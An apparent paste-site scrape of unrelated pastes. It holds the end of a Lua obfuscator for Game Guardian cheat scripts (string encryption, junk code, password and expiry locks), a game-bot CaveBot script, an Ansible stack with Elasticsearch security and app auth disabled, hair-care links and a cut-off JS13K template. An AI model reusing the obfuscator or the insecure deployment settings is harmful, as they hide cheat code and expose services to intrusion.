function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
local KONZLET = function(str, textKey)
local text = ''
for x in str:gmatch('#(%d+)') do
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
text = text .. string.char(x - KeyToInt(textKey) %256)
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
end
text = text:gsub([[\n]], ""\n"")
return text
end
MR = _G
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
for i = 1, 0 do local sssss = {} sssss.sel = sssss.data() if sssss.data ~= nil then sssss.sel = sssss.data() end sssss = nil end
if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;if(nil)then;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end;for i = 1, 0 do;local lienlanh = {{-nil, {nil%-nil, {-nil, {-nil%nil, {nil%nil%-nil, {}}, {}}, {-nil}, {}}, {}}, {nil%nil%-nil}, nil%-nil}}if #lienlanh[-nil%nil%-nil] ~= nil then;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]()lienlanh[-nil%-nil]();end;::FIX::;lienlanh[-nil%nil%-nil] = lienlanh[-nil%nil%nil]();goto FIX;lienlanh = nil;end
function VL() local XX = {} local X = {} X.X = {} X.X.XX = X.data() X.X.XXX = X.X.XX.data() X.XXX = XX.L() X.XXX = X.XXX:L() X.X[V] = X[L] XL() end
]============================================]
DATA = data_read(g.info[1], mode_read_only, mode_read_all)
if g.info[3] ~= false then
day = os.date(""%d"")
Exp_date = gg.prompt({
""📆 设置过期日 : "",
""📢 过期后提示 : "",
}, {
os.date(""%Y%m"" .. day + 1),
""⚠️ 脚本已过期 ⚠️️"",
}, {
""text"", 
""text"",
})
if not Exp_date then break end
if Exp_date[1] == """" then 
return gg.alert(""⚠️ 错误 ⚠️\n\n过期日不可为空！"")
end
if Exp_date[2] == """" then
return gg.alert(""⚠️ 错误 ⚠️\n\n过期后提示不可为空！"")
end
if (string.len(Exp_date[1]) ~= 8) then
return gg.alert(""⚠️ 错误 ⚠️\n\n日期超出范围限制！"")
end
if Exp_date[1] and Exp_date[2] ~= nil then
Exp_data = [[
if os.date(""%Y%m%d"") >= ""]] .. Exp_date[1] .. [["" then 
print(""]] .. Exp_date[2] .. [["") 
return gg.alert(""]] .. Exp_date[2] .. [["")
end
]]
else
return gg.alert(""⚠️ 出错了 ⚠️"")
end
Expiry_info = ""已添加过期日 : "" .. Exp_date[1]
DATA = Exp_data .. DATA
end
if g.info[4] ~= false then
P4SS = gg.prompt({
""🔑 设置密码 :"",
""📝 密码错误提示 :"",
}, {
"""",
""⚠️ 密码错误 ⚠️"",
}, {
""text"",
""text"",
})
if not P4SS then break end
if P4SS[1] == """" then 
return gg.alert(""⚠️ 错误 ⚠️\n\n密码不可为空！"")
end
if P4SS[2] == """" then
return gg.alert(""⚠️ 错误 ⚠️\n\n密码错误提示不可为空！"")
end 
if P4SS[1] and P4SS[2] ~= nil then
Password = [[
Pazzword = ""]] .. P4SS[1] .. [[""
PW = gg.prompt({
""输入密码: "",
}, nil, {
""text"",
})
if not PW then return end
if PW[1] ~= Pazzword then
print(""]] .. P4SS[2] .. [["")
return gg.alert(""]] .. P4SS[2] .. [["")
else
gg.toast(""密码正确"")
gg.sleep(""1000"")
end
]]
else
return gg.alert(""⚠️ 出错了 ⚠️"")
end
Password_info = "" 密码已添加 : "" .. P4SS[1]
DATA = Password .. DATA
end
gg.toast(""⏳加载中…"")
LUA_Data_sub = DATA
LUA_Data_sub = LUA_Data_sub:gsub('%""(.-)%""', function(text)
text = 'KONZLET(""' .. Encrypt(text) .. '"")'
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""%'(.-)%'"", function(text)
text = 'KONZLET(""' .. Encrypt(text) .. '"")'
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""gg%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""gg"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""os%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""os"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""io%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""io"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""string%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""string"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""table%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""table"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""math%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""math"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""debug%.(%a+)%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""debug"") .. '"")][KONZLET(""' .. Encrypt(text) .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""print%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""print"") .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""loadfile%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""loadfile"") .. '"")]('
return text
end)
LUA_Data_sub = LUA_Data_sub:gsub(""load%("", function(text)
text = 'MR[KONZLET(""' .. Encrypt(""load"") .. '"")]('
return text
end)
DATA = Decrypt .. LUA_Data_sub
DATA = string.dump(load(""local _Title = [[🛡 Encode by Misterz Konzlet 🛡]]\nlocal __ = function()\n"" .. DATA .. ""\nend\n__()\n""), true)
DATA = DATA .. ""@Misterz Konzlet""
local function randomString(length)
local random = """"
local characters = {""A"", ""B"", ""C"", ""D"", ""E"", ""F"", ""G"", ""H"", ""I"", ""J"", ""K"", ""L"", ""M"", ""N"", ""O"", ""P"", ""Q"", ""R"", ""S"", ""T"", ""U"", ""V"", ""W"", ""X"", ""Y"", ""Z"", ""a"", ""b"", ""c"", ""d"", ""e"", ""f"", ""g"", ""h"", ""i"", ""j"", ""k"", ""l"", ""m"", ""n"", ""o"", ""p"", ""q"", ""r"", ""s"", ""t"", ""u"", ""v"", ""w"", ""x"", ""y"", ""z""}
for i=1, length do
random = random..characters[math.random(1, #characters)]
end
return random
end
local String = randomString(10000)
local Decode = String .. [[=function(code)code=load(code)()return code;end;]]
DATA = DATA:gsub(""."", function(code) 
return ""\\"" .. code:byte()
end)
DATA = Decode .. String .. '(""' .. DATA .. '"")'
DATA = [=================================================================[
-- Game Guardian Obfuscator by ༆Shadow Gaming࿐
-- Version 1.1
]=================================================================] .. DATA
if load(DATA) ~= nil then
if Expiry_info == nil then 
Expiry_info = "" 已设置过期日 : 否"" 
end
if Password_info == nil then 
Password_info = ""密码已启用 : 否"" 
end
data_write(LUA_Script_out, mode_write_only, DATA)
gg.sleep(""1000"", gg.toast(""完成 ✔️""))
gg.setVisible(true)
print("" 脚本加密完成 "")
print("""")
print("""")
print(Expiry_info)
print("""")
print(Password_info)
print("""")
print("""")
print(""📂 脚本已保存到 : "" .. LUA_Script_out)
os.exit()
else
gg.alert(""脚本无法加密\n\n请修复代码后再试"")
return os.remove(LUA_Script_out)
end
end
end
end
)()
end
function End()
print("" Developed by Shadow Gaming "")
gg.setVisible(true)
os.exit()
end
while(true)do
gg.sleep(1)
if gg.isVisible(true) then
FMXR=1
gg.setVisible(false)
end
if FMXR==1 then
Main()
end
end"
9nTGNBcz,Untitled,martintokio,Lua,Tuesday 17th of June 2025 07:54:19 AM CDT,"label:bossSpot1
goto:1284,1719,7,0
poscheck:bossSpot1,1,1284,1719,7
use:1285,1720,7
function:[[

--Walk On Item

local id = 15989

local distance = 1

function findObjectInMap(id, distance)

local tiles = g_map.getTiles(posz())

   for i, tile in ipairs(tiles) do

    for u, item in ipairs(tile:getItems()) do

      if item:getId() == id and getDistanceBetween(pos(), tile:getPosition()) <= distance then

        autoWalk(tile:getPosition(), 100, {ignoreNonPathable = true})

          CaveBot.delay(500)

          return

      end

    end

end

end

findObjectInMap(id, distance)

return true


]]
label:bossAlive
function:[[

--Check Bosses

local minMonsters = 1

local whitelistMonsters = { ""big dinozaur"", ""elite hobo"", ""big bandit"", ""infected saibamen"", ""mystic namekjin"", ""mystic cooler"", ""ultra namekjin"", ""golden cell"", ""gold cell"", ""gold majin"", ""gold namekjin"", ""mystic janemba"", ""mystic shin"", ""mystic jiren"", ""fury bardock"", ""mystic uub"", ""mystic machin"", ""mystic invader"", ""legendary saiyan"", ""mystic tsuful"", ""mystic tenshin"", ""espinor"", ""ultra warrior"", ""evil legendary tsuful"", ""dark kenny"", ""strong legendary krillin"", ""strong ice dragon"", ""strong fire dragon"", ""dabura"", ""doton ninja"", ""king emeads"", ""ivision"", ""ultra tapion"", ""ultra  majin"", ""strong ancient bandit"", ""strong xicor"", ""strong brolly"", ""gogeta ssj4"", ""gold janemba"", ""gold beerus"", ""explosive barrel"", ""dr gero"", ""fire ball""}

local creatureCount = 0

for _, mob in ipairs(getSpectators(posz())) do

    if mob:isMonster() and table.find(whitelistMonsters, mob:getName():lower()) then

        creatureCount = creatureCount + 1

    end

end

if creatureCount >= minMonsters then

    CaveBot.gotoLabel(""bossAlive"")

    CaveBot.delay(5000)

end

return creatureCount >= minMonsters


]]
label:bossSpot2
goto:1284,1719,7,0
poscheck:bossSpot2,1,1284,1719,7
function:[[

--Walk On Item

local id = 15989

local distance = 1

function findObjectInMap(id, distance)

local tiles = g_map.getTiles(posz())

   for i, tile in ipairs(tiles) do

    for u, item in ipairs(tile:getItems()) do

      if item:getId() == id and getDistanceBetween(pos(), tile:getPosition()) <= distance then

        autoWalk(tile:getPosition(), 100, {ignoreNonPathable = true})

          CaveBot.delay(500)

          return

      end

    end

end

end

findObjectInMap(id, distance)

return true


]]
use:1285,1720,7
function:[[

--Check Bosses

local minMonsters = 1

local whitelistMonsters = { ""big dinozaur"", ""elite hobo"", ""big bandit"", ""infected saibamen"", ""mystic namekjin"", ""mystic cooler"", ""ultra namekjin"", ""golden cell"", ""gold cell"", ""gold majin"", ""gold namekjin"", ""mystic janemba"", ""mystic shin"", ""mystic jiren"", ""fury bardock"", ""mystic uub"", ""mystic machin"", ""mystic invader"", ""legendary saiyan"", ""mystic tsuful"", ""mystic tenshin"", ""espinor"", ""ultra warrior"", ""evil legendary tsuful"", ""dark kenny"", ""strong legendary krillin"", ""strong ice dragon"", ""strong fire dragon"", ""dabura"", ""doton ninja"", ""king emeads"", ""ivision"", ""ultra tapion"", ""ultra  majin"", ""strong ancient bandit"", ""strong xicor"", ""strong brolly"", ""gogeta ssj4"", ""gold janemba"", ""gold beerus"", ""explosive barrel"", ""dr gero"", ""fire ball""}

local creatureCount = 0

for _, mob in ipairs(getSpectators(posz())) do

    if mob:isMonster() and table.find(whitelistMonsters, mob:getName():lower()) then

        creatureCount = creatureCount + 1

    end

end

if creatureCount >= minMonsters then

    CaveBot.gotoLabel(""bossAlive"")

    CaveBot.delay(5000)

end

return creatureCount >= minMonsters


]]"
kx1Cx9c9,Untitled,excuseem,YAML,Tuesday 17th of June 2025 07:52:44 AM CDT,"---

- name: Deploy elasticsearch and Kibana
  docker_stack:
    state: present
    name: cinevoy
    prune: yes
    resolve_image: always
    with_registry_auth: yes
    compose:
      - version: ""3.8""
        services:
          elasticsearch:
            image: ""docker.elastic.co/elasticsearch/elasticsearch:{{ ELASTICSEARCH_APP.STACK_VERSION }}""
            deploy:
              mode: global
              update_config:
                parallelism: 1
                order: stop-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.elasticsearch == node
            volumes:
              - ""es-data:/usr/share/elasticsearch/data""
            networks:
              - network_1
            ports:
              - ""{{ ELASTICSEARCH_APP.ES_PORT }}:9200""
            environment:
              - ""discovery.type=single-node""

              #              - node.name={{ inventory_hostname }}
              #              - cluster.name={{ ELASTICSEARCH_APP.CLUSTER_NAME }}
              #              - cluster.initial_master_nodes=cinevoy_elasticsearch
              #              - discovery.seed_hosts=cinevoy_elasticsearch
              - ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}
              - bootstrap.memory_lock=true
              - xpack.security.enabled=false
              - xpack.security.http.ssl.enabled=false
              - xpack.security.transport.ssl.enabled=false
              - xpack.license.self_generated.type={{ ELASTICSEARCH_APP.LICENSE }}
              - http.cors.enabled=true
              - http.cors.allow-origin=http://localhost:8080
            ulimits:
              memlock:
                soft: -1
                hard: -1
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl http://localhost:9200 | grep -q 'You Know, for Search'"",
                ]
              interval: 10s
              timeout: 10s
              retries: 120

          kibana:
            depends_on:
              - elasticsearch
            image: ""docker.elastic.co/kibana/kibana:{{ ELASTICSEARCH_APP.STACK_VERSION }}""
            deploy:
              mode: global
              update_config:
                order: start-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.kibana == node
            volumes:
              - kibana-data:/usr/share/kibana/data
            networks:
              - network_1
            ports:
              - ""{{ ELASTICSEARCH_APP.KIBANA_PORT }}:5601""
            environment:
              - ""SERVERNAME=kibana""
              - ""ELASTICSEARCH_HOSTS=http://cinevoy_elasticsearch:9200""
              - ""ELASTICSEARCH_USERNAME=kibana_system""
              - ""ELASTICSEARCH_PASSWORD={{ ELASTICSEARCH_APP.KIBANA_PASSWORD }}""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -s -I http://localhost:5601 | grep -q 'HTTP/1.1 302 Found'"",
                ]
              interval: 10s
              timeout: 10s
              retries: 120

          elasticvue:
            image: ""cars10/elasticvue""
            deploy:
              mode: replicated
              replicas: 1
              update_config:
                parallelism: 1
                order: start-first
                failure_action: rollback
                delay: 10s
            ports:
              - ""8080:8080""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -f -s http://localhost:8080 || exit 1"",
                ]
              start_period: 10s
              interval: 10s
              timeout: 10s
              retries: 20

          redis:
            image: redis:6.2.13-alpine3.18
            deploy:
              mode: global
              resources:
                limits:
                  memory: 6G
              update_config:
                parallelism: 1
                order: stop-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.redis == node
            command: redis-server --maxmemory 5gb --maxmemory-policy volatile-lru
            volumes:
              - redis-data:/data
            networks:
              - network_1
            ports:
              - ""6379:6379""
            healthcheck:
              test: [ ""CMD"", ""redis-cli"", ""--raw"", ""incr"", ""ping"" ]
              interval: 2s
              timeout: 2s
              retries: 60

          fastapi:
            depends_on:
              - elasticsearch
            image: ""{{ CINEVOY_IMAGE }}""
            deploy:
              mode: replicated
              replicas: 4
              update_config:
                parallelism: 2
                order: start-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.fastapi == node
            networks:
              - network_1
            ports:
              - ""8000:8000""
            environment:
              - ""CSB_REDIS_URL=redis://redis:6379/""
              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
              - ""CSB_ELASTIC_USER=elastic""
              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
              - ""CSB_OPENROUTER_API_KEY={{ ELASTICSEARCH_APP.OPENROUTER_API_KEY }}""
              - ""CSB_AUTH_ENABLE=False""
              - ""CSB_AUTH_USERNAME={{ AUTH_USERNAME }}""
              - ""CSB_AUTH_PASSWORD={{ AUTH_PASSWORD }}""
              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
              - ""CSB_SENTRY_IS_ENABLE=true""
              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
              - ""CSB_JWT_SECRET_KEY={{ JWT_SECRET_KEY }}""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -u {{ AUTH_USERNAME }}:{{AUTH_PASSWORD }} -f -s http://localhost:8000/health/ || exit 1"",
                ]
              interval: 10s
              timeout: 10s
              retries: 5

#          celery_worker:
#            image: ""{{ CINEVOY_IMAGE }}""
#            deploy:
#              mode: replicated
#              replicas: 1
#              update_config:
#                parallelism: 1
#                order: stop-first
#                failure_action: rollback
#                delay: 10s
#              placement:
#                constraints:
#                  - node.labels.fastapi == node
#            command: celery -A searchbox.worker.app worker -Q default --loglevel=INFO --concurrency=1
#            depends_on:
#              - redis
#            networks:
#              - network_1
#            environment:
#              - ""CSB_REDIS_URL=redis://redis:6379/""
#              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
#              - ""CSB_ELASTIC_USER=elastic""
#              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
#              - ""CSB_KP_DEV_API_KEY={{ ELASTICSEARCH_APP.KP_DEV_API_KEY }}""
#              - ""CSB_OPENROUTER_API_KEY={{ ELASTICSEARCH_APP.OPENROUTER_API_KEY }}""
#              - ""CSB_MYSQL_HOST={{ MYSQL_HOST }}""
#              - ""CSB_MYSQL_DB={{ MYSQL_DB }}""
#              - ""CSB_MYSQL_USER={{ MYSQL_USER }}""
#              - ""CSB_MYSQL_PASSWORD={{ MYSQL_PASSWORD }}""
#              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
#              - ""CSB_SENTRY_IS_ENABLE=true""
#              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
#            healthcheck:
#              test:
#                [
#                  ""CMD-SHELL"",
#                  ""celery -A searchbox.worker.app inspect ping --destination celery@$$HOSTNAME"",
#                ]
#              start_period: 10s
#              interval: 10s
#              timeout: 10s
#              retries: 20
#
#          celery_worker_multithread:
#            image: ""{{ CINEVOY_IMAGE }}""
#            deploy:
#              mode: replicated
#              replicas: 4
#              update_config:
#                parallelism: 2
#                order: start-first
#                failure_action: rollback
#                delay: 10s
#              placement:
#                constraints:
#                  - node.labels.fastapi == node
#            command: celery -A searchbox.worker.app worker -Q multithread --loglevel=INFO --concurrency=1
#            depends_on:
#              - redis
#            networks:
#              - network_1
#            environment:
#              - ""CSB_REDIS_URL=redis://redis:6379/""
#              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
#              - ""CSB_ELASTIC_USER=elastic""
#              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
#              - ""CSB_KP_DEV_API_KEY={{ ELASTICSEARCH_APP.KP_DEV_API_KEY }}""
#              - ""CSB_OPENROUTER_API_KEY={{ ELASTICSEARCH_APP.OPENROUTER_API_KEY }}""
#              - ""CSB_MYSQL_HOST={{ MYSQL_HOST }}""
#              - ""CSB_MYSQL_DB={{ MYSQL_DB }}""
#              - ""CSB_MYSQL_USER={{ MYSQL_USER }}""
#              - ""CSB_MYSQL_PASSWORD={{ MYSQL_PASSWORD }}""
#              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
#              - ""CSB_SENTRY_IS_ENABLE=true""
#              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
#            healthcheck:
#              test:
#                [
#                  ""CMD-SHELL"",
#                  ""celery -A searchbox.worker.app inspect ping --destination celery@$$HOSTNAME"",
#                ]
#              start_period: 10s
#              interval: 10s
#              timeout: 10s
#              retries: 20

          celery_flower:
            image: ""{{ CINEVOY_IMAGE }}""
            deploy:
              mode: replicated
              replicas: 1
              update_config:
                parallelism: 1
                order: start-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.fastapi == node
            command: celery -A searchbox.worker.app flower --loglevel=DEBUG
            depends_on:
              - redis
              - celery_worker
            networks:
              - network_1
            ports:
              - ""5555:5555""
            environment:
              - ""CSB_REDIS_URL=redis://redis:6379/""
              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
              - ""CSB_ELASTIC_USER=elastic""
              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
              - ""CSB_SENTRY_IS_ENABLE=true""
              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -f -s http://localhost:5555/ || exit 1"",
                ]
              interval: 10s
              timeout: 10s
              retries: 5


#          cron_scheduler:
#            image: ""{{ CINEVOY_IMAGE }}""
#            deploy:
#              mode: replicated
#              replicas: 1
#              update_config:
#                parallelism: 1
#                order: stop-first
#                failure_action: pause
#                delay: 10s
#              placement:
#                constraints:
#                  - node.labels.fastapi == node
#            command: python searchbox/cron_scheduler/main.py
#            depends_on:
#              - redis
#            networks:
#              - network_1
#            environment:
#              - ""CSB_REDIS_URL=redis://redis:6379/""
#              - ""CSB_ELASTIC_HOST=http://cinevoy_elasticsearch:9200""
#              - ""CSB_ELASTIC_USER=elastic""
#              - ""CSB_ELASTIC_PASSWORD={{ ELASTICSEARCH_APP.ELASTIC_PASSWORD }}""
#              - ""CSB_KP_DEV_API_KEY={{ ELASTICSEARCH_APP.KP_DEV_API_KEY }}""
#              - ""CSB_OPENROUTER_API_KEY={{ ELASTICSEARCH_APP.OPENROUTER_API_KEY }}""
#              - ""CSB_MYSQL_HOST={{ MYSQL_HOST }}""
#              - ""CSB_MYSQL_DB={{ MYSQL_DB }}""
#              - ""CSB_MYSQL_USER={{ MYSQL_USER }}""
#              - ""CSB_MYSQL_PASSWORD={{ MYSQL_PASSWORD }}""
#              - ""CSB_STAMEDIA_TSV_FILE=/app/stamedia.tsv""
#              - ""CSB_SENTRY_IS_ENABLE=true""
#              - ""CSB_SENTRY_DSN={{ SENTRY_DSN }}""
#            healthcheck:
#              test:
#                [
#                  ""CMD-SHELL"",
#                  ""sh searchbox/cron_scheduler/check_socket_health.sh"",
#                ]
#              start_period: 10s
#              interval: 10s
#              timeout: 10s
#              retries: 20

          web:
            image: ""{{ CINEVOY_WEB_IMAGE }}""
            deploy:
              mode: replicated
              replicas: 1
              update_config:
                parallelism: 1
                order: start-first
                failure_action: rollback
                delay: 10s
              placement:
                constraints:
                  - node.labels.fastapi == node
            ports:
              - ""8001:80""
            healthcheck:
              test:
                [
                  ""CMD-SHELL"",
                  ""curl -f -s -u {{ DEMO_USER }}:{{ DEMO_PASSWORD }} http://localhost:80/ || exit 1"",
                ]
              interval: 10s
              timeout: 10s
              retries: 5

          webplayer:
            image: ""{{ CINEVOY_WEBPLAYER_IMAGE }}""
            deploy:
              mode: replicated
              replicas: 1
#              update_config:
#                parallelism: 1
#                order: start-first
#                failure_action: rollback
#                delay: 10s
              placement:
                constraints:
                  - node.labels.fastapi == node
            ports:
              - ""8002:3000""
#            healthcheck:
#              test:
#                [
#                  ""CMD-SHELL"",
#                  ""curl -f -s http://localhost:3000/ || exit 1"",
#                ]
#              interval: 10s
#              timeout: 10s
#              retries: 5

        networks:
          network_1:
            driver: overlay
            attachable: true

        volumes:
          es-data:
            driver: local
          kibana-data:
            driver: local
          redis-data:
            driver: local

  when: inventory_hostname in groups['eks'][0]
"
BBn0F47K,Untitled,rubiin,JavaScript,Tuesday 17th of June 2025 07:30:26 AM CDT,"https://www.youtube.com/shorts/4A18ok8LXoo


how to use
 https://www.youtube.com/watch?v=8ee03NcrmVQ&t=29s

5-10 mins per session
4-5 hours before wash


https://tressless.com/learn/microneedling
https://perfecthairhealth.com/microneedling-the-scalp-does-it-cause-scarring/
https://www.drserkanaygin.com/blog/how-to-use-dermaroller-for-hair-loss/"
wL16HmS5,JS13K 2025 - Input v0.1,Alex_ADEdge,JavaScript,Tuesday 17th of June 2025 06:51:28 AM CDT,"<!-- JS13K, 2025, By AlexDeltaDev twitter.com/Alex_ADEdge -->
<!-- Based on this mapping by XEM: https://xem.github.io/articles/jsgamesinputs.html -->
<!DOCTYPE html>
<html lang=""en"">
    <head>
        <meta charset=""UTF-8"">
        <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
        <title>JS13K-Warmup-Template</title>
        <style> 
            html, body {
                width: 100%;
                height: 100%;
                touch-action: none;
                overflow: hidden;
                display: flex;
                justify-content: center;
                align-items: center;  
                background-color: #272744;
            }
            #title {
                position: absolute; 
                bottom: 3px; 
                left: 25px; 
                color: aliceblue;
